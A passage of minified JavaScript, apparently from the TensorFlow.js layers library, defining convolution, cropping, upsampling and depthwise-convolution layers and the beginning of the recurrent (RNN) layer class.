            this.biasConstraint = he(e.biasConstraint),
            this.biasRegularizer = _t(e.biasRegularizer),
            this.activityRegularizer = _t(e.activityRegularizer),
            this.dilationRate = or(null == e.dilationRate ? 1 : e.dilationRate, t, "dilationRate"),
            1 === this.rank && Array.isArray(this.dilationRate) && 1 !== this.dilationRate.length)
                throw new $(`dilationRate must be a number or an array of a single number for 1D convolution, but received ${JSON.stringify(this.dilationRate)}`);
            if (2 === this.rank) {
                if ("number" == typeof this.dilationRate)
                    this.dilationRate = [this.dilationRate, this.dilationRate];
                else if (2 !== this.dilationRate.length)
                    throw new $(`dilationRate must be a number or array of two numbers for 2D convolution, but received ${JSON.stringify(this.dilationRate)}`)
            } else if (3 === this.rank)
                if ("number" == typeof this.dilationRate)
                    this.dilationRate = [this.dilationRate, this.dilationRate, this.dilationRate];
                else if (3 !== this.dilationRate.length)
                    throw new $(`dilationRate must be a number or array of three numbers for 3D convolution, but received ${JSON.stringify(this.dilationRate)}`)
        }
        static verifyArgs(t) {
            if (Bn("kernelSize"in t, "required key 'kernelSize' not in config"),
            "number" != typeof t.kernelSize && !Rh(t.kernelSize, "number", 1, 3))
                throw new $(`BaseConv expects config.kernelSize to be number or number[] with length 1, 2, or 3, but received ${JSON.stringify(t.kernelSize)}.`)
        }
        getConfig() {
            const t = {
                kernelSize: this.kernelSize,
                strides: this.strides,
                padding: this.padding,
                dataFormat: this.dataFormat,
                dilationRate: this.dilationRate,
                activation: Gs(this.activation),
                useBias: this.useBias,
                biasInitializer: Qt(this.biasInitializer),
                biasRegularizer: Vt(this.biasRegularizer),
                activityRegularizer: Vt(this.activityRegularizer),
                biasConstraint: de(this.biasConstraint)
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    class rr extends al {
        constructor(t, e) {
            super(t, e),
            this.kernel = null,
            rr.verifyArgs(e),
            this.filters = e.filters,
            be(this.filters, "filters"),
            this.kernelInitializer = Ht(e.kernelInitializer || this.DEFAULT_KERNEL_INITIALIZER),
            this.kernelConstraint = he(e.kernelConstraint),
            this.kernelRegularizer = _t(e.kernelRegularizer)
        }
        build(t) {
            t = Nt(t);
            const e = "channelsFirst" === this.dataFormat ? 1 : t.length - 1;
            if (null == t[e])
                throw new $(`The channel dimension of the input should be defined. Found ${t[e]}`);
            const s = t[e]
              , o = this.kernelSize.concat([s, this.filters]);
            this.kernel = this.addWeight("kernel", o, null, this.kernelInitializer, this.kernelRegularizer, !0, this.kernelConstraint),
            this.useBias && (this.bias = this.addWeight("bias", [this.filters], null, this.biasInitializer, this.biasRegularizer, !0, this.biasConstraint)),
            this.inputSpec = [{
                ndim: this.rank + 2,
                axes: {
                    [e]: s
                }
            }],
            this.built = !0
        }
        call(t, e) {
            return M((()=>{
                let s;
                t = mt(t);
                const o = null == this.bias ? null : this.bias.read()
                  , r = l0(this.activation.getClassName());
                if (null != r && 2 === this.rank)
                    s = Gb(t, this.kernel.read(), o, this.strides, this.padding, this.dataFormat, this.dilationRate, r);
                else {
                    if (1 === this.rank)
                        s = function mG(n, t, e, s=1, o="valid", r, i=1) {
                            return M((()=>{
                                if (null == r && (r = "channelsLast"),
                                se(r),
                                3 !== n.shape.length)
                                    throw new $(`The input of a conv1dWithBias operation should be 3, but is ${n.shape.length} instead.`);
                                if (3 !== t.shape.length)
                                    throw new $(`The kernel for a conv1dWithBias operation should be 3, but is ${t.shape.length} instead`);
                                if (null != e && 1 !== e.shape.length)
                                    throw new $(`The bias for a conv1dWithBias operation should be 1, but is ${t.shape.length} instead`);
                                if ("channelsFirst" === r && (n = kt(n, [0, 2, 1])),
                                "causal" === o)
                                    throw new bt("The support for CAUSAL padding mode in conv1dWithBias is not implemented yet.");
                                let a = Lm(n, t, s, "same" === o ? "same" : "valid", "NWC", i);
                                return null != e && (a = Ln(a, e)),
                                a
                            }
                            ))
                        }(t, this.kernel.read(), o, this.strides[0], this.padding, this.dataFormat, this.dilationRate[0]);
                    else if (2 === this.rank)
                        s = Gb(t, this.kernel.read(), o, this.strides, this.padding, this.dataFormat, this.dilationRate);
                    else {
                        if (3 !== this.rank)
                            throw new bt("convolutions greater than 3D are not implemented yet.");
                        s = function gG(n, t, e, s=[1, 1, 1], o="valid", r, i) {
                            return M((()=>{
                                if (null == r && (r = "channelsLast"),
                                se(r),
                                4 !== n.rank && 5 !== n.rank)
                                    throw new $(`conv3dWithBias expects input to be of rank 4 or 5, but received ${n.rank}.`);
                                if (4 !== t.rank && 5 !== t.rank)
                                    throw new $(`conv3dWithBias expects kernel to be of rank 4 or 5, but received ${n.rank}.`);
                                let a = $b(n, r);
                                if ("causal" === o)
                                    throw new bt("The support for CAUSAL padding mode in conv3dWithBias is not implemented yet.");
                                return a = C2(a, t, s, "same" === o ? "same" : "valid", "NDHWC", i),
                                null != e && (a = Ln(a, e)),
                                "channelsFirst" === r && (a = kt(a, [0, 4, 1, 2, 3])),
                                a
                            }
                            ))
                        }(t, this.kernel.read(), o, this.strides, this.padding, this.dataFormat, this.dilationRate)
                    }
                    null != this.activation && (s = this.activation.apply(s))
                }
                return s
            }
            ))
        }
        computeOutputShape(t) {
            t = Nt(t);
            const e = []
              , s = "channelsLast" === this.dataFormat ? t.slice(1, t.length - 1) : t.slice(2);
            for (let r = 0; r < s.length; ++r) {
                const i = Wn(s[r], this.kernelSize[r], this.padding, this.strides[r], "number" == typeof this.dilationRate ? this.dilationRate : this.dilationRate[r]);
                e.push(i)
            }
            let o = [t[0]];
            return "channelsLast" === this.dataFormat ? (o = o.concat(e),
            o.push(this.filters)) : (o.push(this.filters),
            o = o.concat(e)),
            o
        }
        getConfig() {
            const t = {
                filters: this.filters,
                kernelInitializer: Qt(this.kernelInitializer),
                kernelRegularizer: Vt(this.kernelRegularizer),
                kernelConstraint: de(this.kernelConstraint)
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
        static verifyArgs(t) {
            if (!("filters"in t) || "number" != typeof t.filters || t.filters < 1)
                throw new $(`Convolution layer expected config.filters to be a 'number' > 0 but got ${JSON.stringify(t.filters)}`)
        }
    }
    class Qi extends rr {
        constructor(t) {
            super(2, t),
            Qi.verifyArgs(t)
        }
        getConfig() {
            const t = super.getConfig();
            return delete t.rank,
            t
        }
        static verifyArgs(t) {
            if ("number" != typeof t.kernelSize && !Rh(t.kernelSize, "number", 1, 2))
                throw new $(`Conv2D expects config.kernelSize to be number or number[] with length 1 or 2, but received ${JSON.stringify(t.kernelSize)}.`)
        }
    }
    Qi.className = "Conv2D",
    _(Qi);
    class Ji extends rr {
        constructor(t) {
            super(3, t),
            Ji.verifyArgs(t)
        }
        getConfig() {
            const t = super.getConfig();
            return delete t.rank,
            t
        }
        static verifyArgs(t) {
            if ("number" != typeof t.kernelSize && (!Array.isArray(t.kernelSize) || 1 !== t.kernelSize.length && 3 !== t.kernelSize.length))
                throw new $(`Conv3D expects config.kernelSize to be number or [number, number, number], but received ${JSON.stringify(t.kernelSize)}.`)
        }
    }
    Ji.className = "Conv3D",
    _(Ji);
    class Lb extends Qi {
        constructor(t) {
            if (super(t),
            this.inputSpec = [new ue({
                ndim: 4
            })],
            "same" !== this.padding && "valid" !== this.padding)
                throw new $(`Conv2DTranspose currently supports only padding modes 'same' and 'valid', but received padding mode ${this.padding}`)
        }
        build(t) {
            if (4 !== (t = Nt(t)).length)
                throw new $("Input should have rank 4; Received input shape: " + JSON.stringify(t));
            const e = "channelsFirst" === this.dataFormat ? 1 : t.length - 1;
            if (null == t[e])
                throw new $("The channel dimension of the inputs should be defined. Found `None`.");
            const s = t[e]
              , o = this.kernelSize.concat([this.filters, s]);
            this.kernel = this.addWeight("kernel", o, "float32", this.kernelInitializer, this.kernelRegularizer, !0, this.kernelConstraint),
            this.useBias && (this.bias = this.addWeight("bias", [this.filters], "float32", this.biasInitializer, this.biasRegularizer, !0, this.biasConstraint)),
            this.inputSpec = [new ue({
                ndim: 4,
                axes: {
                    [e]: s
                }
            })],
            this.built = !0
        }
        call(t, e) {
            return M((()=>{
                let s = mt(t);
                if (4 !== s.shape.length)
                    throw new $(`Conv2DTranspose.call() expects input tensor to be rank-4, but received a tensor of rank-${s.shape.length}`);
                const o = s.shape
                  , r = o[0];
                let i, a;
                "channelsFirst" === this.dataFormat ? (i = 2,
                a = 3) : (i = 1,
                a = 2);
                const c = o[i]
                  , l = o[a]
                  , u = this.kernelSize[0]
                  , d = this.kernelSize[1]
                  , h = this.strides[0]
                  , p = this.strides[1]
                  , g = [r, Yn(c, h, u, this.padding), Yn(l, p, d, this.padding), this.filters];
                "channelsLast" !== this.dataFormat && (s = kt(s, [0, 2, 3, 1]));
                let b = Em(s, this.kernel.read(), g, this.strides, this.padding);
                return "channelsLast" !== this.dataFormat && (b = kt(b, [0, 3, 1, 2])),
                null != this.bias && (b = Ln(b, this.bias.read(), this.dataFormat)),
                null != this.activation && (b = this.activation.apply(b)),
                b
            }
            ))
        }
        computeOutputShape(t) {
            const e = (t = Nt(t)).slice();
            let s, o, r;
            "channelsFirst" === this.dataFormat ? (s = 1,
            o = 2,
            r = 3) : (s = 3,
            o = 1,
            r = 2);
            const i = this.kernelSize[0]
              , a = this.kernelSize[1]
              , c = this.strides[0]
              , l = this.strides[1];
            return e[s] = this.filters,
            e[o] = Yn(e[o], c, i, this.padding),
            e[r] = Yn(e[r], l, a, this.padding),
            e
        }
        getConfig() {
            const t = super.getConfig();
            return delete t.dilationRate,
            t
        }
    }
    Lb.className = "Conv2DTranspose",
    _(Lb);
    class Eb extends Ji {
        constructor(t) {
            if (super(t),
            this.inputSpec = [new ue({
                ndim: 5
            })],
            "same" !== this.padding && "valid" !== this.padding)
                throw new $(`Conv3DTranspose currently supports only padding modes 'same' and 'valid', but received padding mode ${this.padding}`)
        }
        build(t) {
            if (5 !== (t = Nt(t)).length)
                throw new $("Input should have rank 5; Received input shape: " + JSON.stringify(t));
            const e = "channelsFirst" === this.dataFormat ? 1 : t.length - 1;
            if (null == t[e])
                throw new $("The channel dimension of the inputs should be defined. Found `None`.");
            const s = t[e]
              , o = this.kernelSize.concat([this.filters, s]);
            this.kernel = this.addWeight("kernel", o, "float32", this.kernelInitializer, this.kernelRegularizer, !0, this.kernelConstraint),
            this.useBias && (this.bias = this.addWeight("bias", [this.filters], "float32", this.biasInitializer, this.biasRegularizer, !0, this.biasConstraint)),
            this.inputSpec = [new ue({
                ndim: 5,
                axes: {
                    [e]: s
                }
            })],
            this.built = !0
        }
        call(t, e) {
            return M((()=>{
                let s = mt(t);
                if (5 !== s.shape.length)
                    throw new $(`Conv3DTranspose.call() expects input tensor to be rank-4, but received a tensor of rank-${s.shape.length}`);
                const o = s.shape
                  , r = o[0];
                let i, a, c;
                "channelsFirst" === this.dataFormat ? (c = 2,
                i = 3,
                a = 4) : (c = 1,
                i = 2,
                a = 3);
                const l = o[c]
                  , u = o[i]
                  , d = o[a]
                  , h = this.kernelSize[0]
                  , p = this.kernelSize[1]
                  , f = this.kernelSize[2]
                  , m = this.strides[0]
                  , g = this.strides[1]
                  , b = this.strides[2]
                  , w = [r, Yn(l, m, h, this.padding), Yn(u, g, p, this.padding), Yn(d, b, f, this.padding), this.filters];
                "channelsLast" !== this.dataFormat && (s = kt(s, [0, 2, 3, 4, 1]));
                let C = k2(s, this.kernel.read(), w, this.strides, this.padding);
                return "channelsLast" !== this.dataFormat && (C = kt(C, [0, 4, 1, 2, 3])),
                null !== this.bias && (C = Ln(C, this.bias.read(), this.dataFormat)),
                null !== this.activation && (C = this.activation.apply(C)),
                C
            }
            ))
        }
        computeOutputShape(t) {
            const e = (t = Nt(t)).slice();
            let s, o, r, i;
            "channelsFirst" === this.dataFormat ? (s = 1,
            o = 2,
            r = 3,
            i = 4) : (s = 4,
            o = 1,
            r = 2,
            i = 3);
            const a = this.kernelSize[0]
              , c = this.kernelSize[1]
              , l = this.kernelSize[2]
              , u = this.strides[0]
              , d = this.strides[1]
              , h = this.strides[2];
            return e[s] = this.filters,
            e[o] = Yn(e[o], u, a, this.padding),
            e[r] = Yn(e[r], d, c, this.padding),
            e[i] = Yn(e[i], h, l, this.padding),
            e
        }
        getConfig() {
            const t = super.getConfig();
            return delete t.dilationRate,
            t
        }
    }
    Eb.className = "Conv3DTranspose",
    _(Eb);
    class Db extends rr {
        constructor(t, e) {
            if (super(t, e),
            this.DEFAULT_DEPTHWISE_INITIALIZER = "glorotUniform",
            this.DEFAULT_POINTWISE_INITIALIZER = "glorotUniform",
            this.depthwiseKernel = null,
            this.pointwiseKernel = null,
            null == e.filters)
                throw new $("The `filters` configuration field is required by SeparableConv, but is unspecified.");
            if (null != e.kernelInitializer || null != e.kernelRegularizer || null != e.kernelConstraint)
                throw new $("Fields kernelInitializer, kernelRegularizer and kernelConstraint are invalid for SeparableConv2D. Use depthwiseInitializer, depthwiseRegularizer, depthwiseConstraint, pointwiseInitializer, pointwiseRegularizer and pointwiseConstraint instead.");
            if (null != e.padding && "same" !== e.padding && "valid" !== e.padding)
                throw new $(`SeparableConv${this.rank}D supports only padding modes: 'same' and 'valid', but received ${JSON.stringify(e.padding)}`);
            this.depthMultiplier = null == e.depthMultiplier ? 1 : e.depthMultiplier,
            this.depthwiseInitializer = Ht(e.depthwiseInitializer || this.DEFAULT_DEPTHWISE_INITIALIZER),
            this.depthwiseRegularizer = _t(e.depthwiseRegularizer),
            this.depthwiseConstraint = he(e.depthwiseConstraint),
            this.pointwiseInitializer = Ht(e.depthwiseInitializer || this.DEFAULT_POINTWISE_INITIALIZER),
            this.pointwiseRegularizer = _t(e.pointwiseRegularizer),
            this.pointwiseConstraint = he(e.pointwiseConstraint)
        }
        build(t) {
            if ((t = Nt(t)).length < this.rank + 2)
                throw new $(`Inputs to SeparableConv${this.rank}D should have rank ${this.rank + 2}, but received input shape: ${JSON.stringify(t)}`);
            const e = "channelsFirst" === this.dataFormat ? 1 : t.length - 1;
            if (null == t[e] || t[e] < 0)
                throw new $(`The channel dimension of the inputs should be defined, but found ${JSON.stringify(t[e])}`);
            const s = t[e]
              , o = this.kernelSize.concat([s, this.depthMultiplier])
              , r = [];
            for (let a = 0; a < this.rank; ++a)
                r.push(1);
            r.push(s * this.depthMultiplier, this.filters);
            const i = !0;
            this.depthwiseKernel = this.addWeight("depthwise_kernel", o, "float32", this.depthwiseInitializer, this.depthwiseRegularizer, i, this.depthwiseConstraint),
            this.pointwiseKernel = this.addWeight("pointwise_kernel", r, "float32", this.pointwiseInitializer, this.pointwiseRegularizer, i, this.pointwiseConstraint),
            this.useBias ? this.bias = this.addWeight("bias", [this.filters], "float32", this.biasInitializer, this.biasRegularizer, i, this.biasConstraint) : this.bias = null,
            this.inputSpec = [new ue({
                ndim: this.rank + 2,
                axes: {
                    [e]: s
                }
            })],
            this.built = !0
        }
        call(t, e) {
            return M((()=>{
                let s;
                if (t = mt(t),
                1 === this.rank)
                    throw new bt("1D separable convolution is not implemented yet.");
                return 2 === this.rank && ("channelsFirst" === this.dataFormat && (t = kt(t, [0, 2, 3, 1])),
                s = Jm(t, this.depthwiseKernel.read(), this.pointwiseKernel.read(), this.strides, this.padding, this.dilationRate, "NHWC")),
                this.useBias && (s = Ln(s, this.bias.read(), this.dataFormat)),
                null != this.activation && (s = this.activation.apply(s)),
                "channelsFirst" === this.dataFormat && (s = kt(s, [0, 3, 1, 2])),
                s
            }
            ))
        }
        getConfig() {
            const t = super.getConfig();
            return delete t.rank,
            delete t.kernelInitializer,
            delete t.kernelRegularizer,
            delete t.kernelConstraint,
            t.depthwiseInitializer = Qt(this.depthwiseInitializer),
            t.pointwiseInitializer = Qt(this.pointwiseInitializer),
            t.depthwiseRegularizer = Vt(this.depthwiseRegularizer),
            t.pointwiseRegularizer = Vt(this.pointwiseRegularizer),
            t.depthwiseConstraint = de(this.depthwiseConstraint),
            t.pointwiseConstraint = de(this.pointwiseConstraint),
            t
        }
    }
    Db.className = "SeparableConv";
    class Wb extends Db {
        constructor(t) {
            super(2, t)
        }
    }
    Wb.className = "SeparableConv2D",
    _(Wb);
    class cl extends rr {
        constructor(t) {
            super(1, t),
            cl.verifyArgs(t),
            this.inputSpec = [{
                ndim: 3
            }]
        }
        getConfig() {
            const t = super.getConfig();
            return delete t.rank,
            delete t.dataFormat,
            t
        }
        static verifyArgs(t) {
            if ("number" != typeof t.kernelSize && !Rh(t.kernelSize, "number", 1, 1))
                throw new $(`Conv1D expects config.kernelSize to be number or number[] with length 1, but received ${JSON.stringify(t.kernelSize)}.`)
        }
    }
    cl.className = "Conv1D",
    _(cl);
    class Mb extends Ct {
        constructor(t) {
            super(t),
            "number" == typeof t.cropping ? this.cropping = [[t.cropping, t.cropping], [t.cropping, t.cropping]] : "number" == typeof t.cropping[0] ? this.cropping = [[t.cropping[0], t.cropping[0]], [t.cropping[1], t.cropping[1]]] : this.cropping = t.cropping,
            this.dataFormat = void 0 === t.dataFormat ? "channelsLast" : t.dataFormat,
            this.inputSpec = [{
                ndim: 4
            }]
        }
        computeOutputShape(t) {
            return "channelsFirst" === this.dataFormat ? [t[0], t[1], t[2] - this.cropping[0][0] - this.cropping[0][1], t[3] - this.cropping[1][0] - this.cropping[1][1]] : [t[0], t[1] - this.cropping[0][0] - this.cropping[0][1], t[2] - this.cropping[1][0] - this.cropping[1][1], t[3]]
        }
        call(t, e) {
            return M((()=>{
                if (t = mt(t),
                "channelsLast" === this.dataFormat) {
                    const s = Hc(t, this.cropping[0][0], t.shape[1] - this.cropping[0][0] - this.cropping[0][1], 2);
                    return Hc(s, this.cropping[1][0], t.shape[2] - this.cropping[1][1] - this.cropping[1][0], 3)
                }
                {
                    const s = Hc(t, this.cropping[0][0], t.shape[2] - this.cropping[0][0] - this.cropping[0][1], 3);
                    return Hc(s, this.cropping[1][0], t.shape[3] - this.cropping[1][1] - this.cropping[1][0], 4)
                }
            }
            ))
        }
        getConfig() {
            const t = {
                cropping: this.cropping,
                dataFormat: this.dataFormat
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    Mb.className = "Cropping2D",
    _(Mb);
    class Vb extends Ct {
        constructor(t) {
            super(t),
            this.DEFAULT_SIZE = [2, 2],
            this.inputSpec = [{
                ndim: 4
            }],
            this.size = null == t.size ? this.DEFAULT_SIZE : t.size,
            this.dataFormat = null == t.dataFormat ? "channelsLast" : t.dataFormat,
            se(this.dataFormat),
            this.interpolation = null == t.interpolation ? "nearest" : t.interpolation,
            function _R(n) {
                fo(KR, "InterpolationFormat", n)
            }(this.interpolation)
        }
        computeOutputShape(t) {
            if ("channelsFirst" === this.dataFormat) {
                const e = null == t[2] ? null : this.size[0] * t[2]
                  , s = null == t[3] ? null : this.size[1] * t[3];
                return [t[0], t[1], e, s]
            }
            {
                const e = null == t[1] ? null : this.size[0] * t[1]
                  , s = null == t[2] ? null : this.size[1] * t[2];
                return [t[0], e, s, t[3]]
            }
        }
        call(t, e) {
            return M((()=>{
                let s = mt(t);
                const o = s.shape;
                if ("channelsFirst" === this.dataFormat) {
                    s = kt(s, [0, 2, 3, 1]);
                    const r = this.size[0] * o[2]
                      , i = this.size[1] * o[3]
                      , a = "nearest" === this.interpolation ? is.resizeNearestNeighbor(s, [r, i]) : is.resizeBilinear(s, [r, i]);
                    return kt(a, [0, 3, 1, 2])
                }
                {
                    const r = this.size[0] * o[1]
                      , i = this.size[1] * o[2];
                    return "nearest" === this.interpolation ? is.resizeNearestNeighbor(s, [r, i]) : is.resizeBilinear(s, [r, i])
                }
            }
            ))
        }
        getConfig() {
            const t = {
                size: this.size,
                dataFormat: this.dataFormat,
                interpolation: this.interpolation
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    Vb.className = "UpSampling2D",
    _(Vb);
    class Fb extends al {
        constructor(t) {
            super(2, t),
            this.depthwiseKernel = null,
            this.depthMultiplier = null == t.depthMultiplier ? 1 : t.depthMultiplier,
            this.depthwiseInitializer = Ht(t.depthwiseInitializer || this.DEFAULT_KERNEL_INITIALIZER),
            this.depthwiseConstraint = he(t.depthwiseConstraint),
            this.depthwiseRegularizer = _t(t.depthwiseRegularizer)
        }
        build(t) {
            if ((t = Nt(t)).length < 4)
                throw new $(`Inputs to DepthwiseConv2D should have rank 4. Received input shape: ${JSON.stringify(t)}.`);
            const e = "channelsFirst" === this.dataFormat ? 1 : 3;
            if (null == t[e] || t[e] < 0)
                throw new $(`The channel dimension of the inputs to DepthwiseConv2D should be defined, but is not (${t[e]}).`);
            const s = t[e]
              , o = [this.kernelSize[0], this.kernelSize[1], s, this.depthMultiplier];
            this.depthwiseKernel = this.addWeight("depthwise_kernel", o, null, this.depthwiseInitializer, this.depthwiseRegularizer, !0, this.depthwiseConstraint),
            this.useBias ? this.bias = this.addWeight("bias", [s * this.depthMultiplier], null, this.biasInitializer, this.biasRegularizer, !0, this.biasConstraint) : this.bias = null,
            this.built = !0
        }
        call(t, e) {
            return M((()=>{
                let s = function bG(n, t, e=[1, 1], s="valid", o, r) {
                    return M((()=>{
                        null == o && (o = "channelsLast"),
                        se(o);
                        let i = sp(n, o);
                        if (4 !== n.rank)
                            throw new $(`Input for depthwiseConv2d is required to be 4-D, but is instead ${n.rank}-D`);
                        if (4 !== t.rank)
                            throw new $(`depthwiseKernel is required to be 4-D, but is instead ${t.rank}-D`);
                        return i = xd(i, t, e, "same" === s ? "same" : "valid", "NHWC", r),
                        "channelsFirst" === o && (i = kt(i, [0, 3, 1, 2])),
                        i
                    }
                    ))
                }(t = mt(t), this.depthwiseKernel.read(), this.strides, this.padding, this.dataFormat, null);
                return this.useBias && (s = Ln(s, this.bias.read(), this.dataFormat)),
                null != this.activation && (s = this.activation.apply(s)),
                s
            }
            ))
        }
        computeOutputShape(t) {
            t = Nt(t);
            const e = "channelsFirst" === this.dataFormat ? t[2] : t[1]
              , s = "channelsFirst" === this.dataFormat ? t[3] : t[2]
              , o = "channelsFirst" === this.dataFormat ? t[1] * this.depthMultiplier : t[3] * this.depthMultiplier
              , r = Wn(e, this.kernelSize[0], this.padding, this.strides[0])
              , i = Wn(s, this.kernelSize[1], this.padding, this.strides[1]);
            return "channelsFirst" === this.dataFormat ? [t[0], o, r, i] : [t[0], r, i, o]
        }
        getConfig() {
            const t = super.getConfig();
            return t.depthMultiplier = this.depthMultiplier,
            t.depthwiseInitializer = Qt(this.depthwiseInitializer),
            t.depthwiseRegularizer = Vt(this.depthwiseRegularizer),
            t.depthwiseConstraint = de(this.depthwiseRegularizer),
            t
        }
    }
    function zb(n, t, e, s) {
        if (Array.isArray(n)) {
            if (null != t || null != e)
                throw new $("When inputs is an array, neither initialState or constants should be provided");
            null != s && (e = n.slice(n.length - s, n.length),
            n = n.slice(0, n.length - s)),
            n.length > 1 && (t = n.slice(1, n.length)),
            n = n[0]
        }
        function o(r) {
            return null == r || Array.isArray(r) ? r : [r]
        }
        return {
            inputs: n,
            initialState: t = o(t),
            constants: e = o(e)
        }
    }
    function Xb(n, t, e, s=!1, o, r, i=!1, a=!1) {
        return M((()=>{
            const c = t.shape.length;
            if (c < 3)
                throw new $(`Input should be at least 3D, but is ${c}D.`);
            const l = [1, 0].concat($n(2, c));
            if (t = kt(t, l),
            null != r)
                throw new bt("The rnn() functoin of the deeplearn.js backend does not support constants yet.");
            i && console.warn("Backend rnn(): the unroll = true option is not applicable to the imperative deeplearn.js backend."),
            null != o && ((o = st(st(o, "bool"), "float32")).rank === c - 1 && (o = Ae(o, -1)),
            o = kt(o, l)),
            s && (t = ao(t, 0),
            null != o && (o = ao(o, 0)));
            const u = [];
            let d, h = e;
            const p = t.shape[0]
              , f = lo(t);
            let m, g;
            null != o && (m = lo(o));
            for (let b = 0; b < p; ++b) {
                const x = f[b]
                  , I = M((()=>n(x, h)));
                if (null == o)
                    d = I[0],
                    h = I[1];
                else {
                    const y = M((()=>{
                        const w = m[b]
                          , C = pt(fn(w), w);
                        return {
                            output: Q(E(I[0], w), E(h[0], C)),
                            newStates: h.map(((T,R)=>Q(E(I[1][R], w), E(T, C))))
                        }
                    }
                    ));
                    d = y.output,
                    h = y.newStates
                }
                a && u.push(d)
            }
            return a && (g = On(u, 1)),
            [d, g, h]
        }
        ))
    }
    Fb.className = "DepthwiseConv2D",
    _(Fb);
    class Es extends Ct {
        constructor(t) {
            let e;
            if (super(t),
            null == t.cell)
                throw new $("cell property is missing for the constructor of RNN.");
            if (e = Array.isArray(t.cell) ? new ip({
                cells: t.cell
            }) : t.cell,
            null == e.stateSize)
                throw new $("The RNN cell should have an attribute `stateSize` (tuple of integers, one integer per RNN state).");
            this.cell = e,
            this.returnSequences = null != t.returnSequences && t.returnSequences,
            this.returnState = null != t.returnState && t.returnState,
            this.goBackwards = null != t.goBackwards && t.goBackwards,
            this._stateful = null != t.stateful && t.stateful,
            this.unroll = null != t.unroll && t.unroll,
            this.supportsMasking = !0,
            this.inputSpec = [new ue({
                ndim: 3
            })],
            this.stateSpec = null,
            this.states_ = null,
            this.numConstants = null,
            this.keptStates = []
        }
        getStates() {
            if (null == this.states_) {
                return $n(0, Array.isArray(this.cell.stateSize) ? this.cell.stateSize.length : 1).map((e=>null))
            }
            return this.states_
        }
        setStates(t) {
            this.states_ = t
        }
        computeOutputShape(t) {
            Ph(t) && (t = t[0]);
            let e = this.cell.stateSize;
            Array.isArray(e) || (e = [e]);
            const s = e[0];
            let o;
            if (o = this.returnSequences ? [t[0], t[1], s] : [t[0], s],
            this.returnState) {
                const r = [];
                for (const i of e)
                    r.push([t[0], i]);
                return [o].concat(r)
            }
            return o
        }
        computeMask(t, e) {
            return M((()=>{
                Array.isArray(e) && (e = e[0]);
                const s = this.returnSequences ? e : null;
                if (this.returnState) {
                    const o = this.states.map((r=>null));
                    return [s].concat(o)
                }
                return s
            }
            ))
        }
        get states() {
            if (null == this.states_) {
                const t = Array.isArray(this.cell.stateSize) ? this.cell.stateSize.length : 1
                  , e = [];
                for (let s = 0; s < t; ++s)
                    e.push(null);
                return e
            }
            return this.states_
        }
        set states(t) {
            this.states_ = t
        }
        build(t) {
            if (null != this.numConstants)
                throw new bt("Constants support is not implemented in RNN yet.");
            Ph(t) && (t = t[0]);
            const e = this.stateful ? t[0] : null
              , s = t.slice(2);
            this.inputSpec[0] = new ue({
                shape: [e, null, ...s]
            });
            const o = [t[0]].concat(t.slice(2));
            let r;
            if (this.cell.build(o),
            r = Array.isArray(this.cell.stateSize) ? this.cell.stateSize : [this.cell.stateSize],
            null != this.stateSpec) {
                if (!Rt(this.stateSpec.map((i=>i.shape[i.shape.length - 1])), r))
                    throw new $(`An initialState was passed that is not compatible with cell.stateSize. Received stateSpec=${this.stateSpec}; However cell.stateSize is ${this.cell.stateSize}`)
            } else
                this.stateSpec = r.map((i=>new ue({
                    shape: [null, i]
                })));
            this.stateful && this.resetStates()
        }
        resetStates(t, e=!1) {
            M((()=>{
                if (!this.stateful)
                    throw new Zn("Cannot call resetStates() on an RNN Layer that is not stateful.");
                const s = this.inputSpec[0].shape[0];
                if (null == s)
                    throw new $("If an RNN is stateful, it needs to know its batch size. Specify the batch size of your input tensors: \n- If using a Sequential model, specify the batch size by passing a `batchInputShape` option to your first layer.\n- If using the functional API, specify the batch size by passing a `batchShape` option to your Input layer.");
                if (null == this.states_)
                    Array.isArray(this.cell.stateSize) ? this.states_ = this.cell.stateSize.map((o=>ge([s, o]))) : this.states_ = [ge([s, this.cell.stateSize])];
                else if (null == t)
                    vt(this.states_),
                    null != this.keptStates && (vt(this.keptStates),
                    this.keptStates = []),
                    Array.isArray(this.cell.stateSize) ? this.states_ = this.cell.stateSize.map((o=>ge([s, o]))) : this.states_[0] = ge([s, this.cell.stateSize]);
                else {
                    if (Array.isArray(t) || (t = [t]),
                    t.length !== this.states_.length)
                        throw new $(`Layer ${this.name} expects ${this.states_.length} state(s), but it received ${t.length} state value(s). Input received: ${t}`);
                    !0 === e ? this.keptStates.push(this.states_.slice()) : vt(this.states_);
                    for (let o = 0; o < this.states_.length; ++o) {
                        const r = t[o]
                          , i = Array.isArray(this.cell.stateSize) ? this.cell.stateSize[o] : this.cell.stateSize
                          , a = [s, i];
                        if (!Rt(r.shape, a))
                            throw new $(`State ${o} is incompatible with layer ${this.name}: expected shape=${a}, received shape=${r.shape}`);
                        this.states_[o] = r
                    }
                }
                this.states_ = this.states_.map((o=>en(o.clone())))
            }
            ))
        }
        apply(t, e) {
            let s = null == e ? null : e.initialState
              , o = null == e ? null : e.constants;
            null == e && (e = {});
            const r = zb(t, s, o, this.numConstants);
            t = r.inputs,
            s = r.initialState,
            o = r.constants;
            let i = []
              , a = [];
            if (null != s) {
                e.initialState = s,
                i = i.concat(s),
                this.stateSpec = [];
                for (const l of s)
                    this.stateSpec.push(new ue({
                        shape: l.shape
                    }));
                a = a.concat(this.stateSpec)
            }
            if (null != o && (e.constants = o,
            i = i.concat(o),
            this.numConstants = o.length),
            i[0]instanceof Un) {
                const l = [t].concat(i)
                  , u = this.inputSpec.concat(a)
                  , d = this.inputSpec;
                this.inputSpec = u;
                const h = super.apply(l, e);
                return this.inputSpec = d,
                h
            }
            return super.apply(t, e)
        }
        call(t, e) {
            return M((()=>{
                const s = null == e ? null : e.mask
                  , o = null == e ? null : e.training;
                let r = null == e ? null : e.initialState;
                t = mt(t),
                null == r && (r = this.stateful ? this.states_ : this.getInitialState(t));
                const i = Array.isArray(this.cell.stateSize) ? this.cell.stateSize.length : 1;
                if (r.length !== i)
                    throw new $(`RNN Layer has ${i} state(s) but was passed ${r.length} initial state(s).`);
                this.unroll && console.warn("Ignoring unroll = true for RNN layer, due to imperative backend.");
                const a = {
                    training: o
                }
                  , l = Xb(((f,m)=>{
                    const g = this.cell.call([f].concat(m), a);
                    return [g[0], g.slice(1)]
                }
                ), t, r, this.goBackwards, s, null, this.unroll, this.returnSequences)
